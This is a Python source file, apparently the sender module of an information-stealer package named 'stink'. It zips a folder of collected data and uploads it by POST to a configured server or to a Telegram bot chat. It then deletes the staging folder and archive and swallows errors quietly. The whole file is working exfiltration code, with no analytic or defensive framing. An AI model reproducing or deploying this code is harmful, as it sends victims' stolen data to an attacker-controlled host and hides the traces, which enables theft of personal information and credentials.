from os import remove, path
from shutil import make_archive, rmtree
from urllib.request import Request, urlopen

from stink.helpers.config import SenderConfig
from stink.helpers import MultipartFormDataEncoder


class Sender:

    def __init__(self, zip_name: str, storage_path: str, server: str, token: str, user_id: int, errors: bool):

        self.__config = SenderConfig()

        self.__zip_name = zip_name
        self.__storage_path = storage_path
        self.__server = server
        self.__token = token
        self.__user_id = user_id
        self.__errors = errors

    def __create_archive(self):

        make_archive(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}", "zip", self.__storage_path)

    def __get_sender_data(self):

        with open(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip", "rb") as file:

            if self.__server is not None:
                link = self.__server
                fields = []
            else:
                link = f"https://api.telegram.org/bot{self.__token}/sendDocument"
                fields = [("chat_id", self.__user_id)]

            content_type, body = MultipartFormDataEncoder().encode(
                fields,
                [("document", f"{self.__zip_name}.zip", file)]
            )

            return content_type, body, link

    def __send_archive(self):

        content_type, body, link = self.__get_sender_data()
        query = Request(method="POST", url=link, data=body)

        query.add_header("User-Agent", self.__config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def __delete_files(self):

        rmtree(self.__storage_path)
        remove(rf"{path.dirname(self.__storage_path)}\{self.__zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:
            if self.__errors is True: print(f"[Sender]: {repr(e)}")
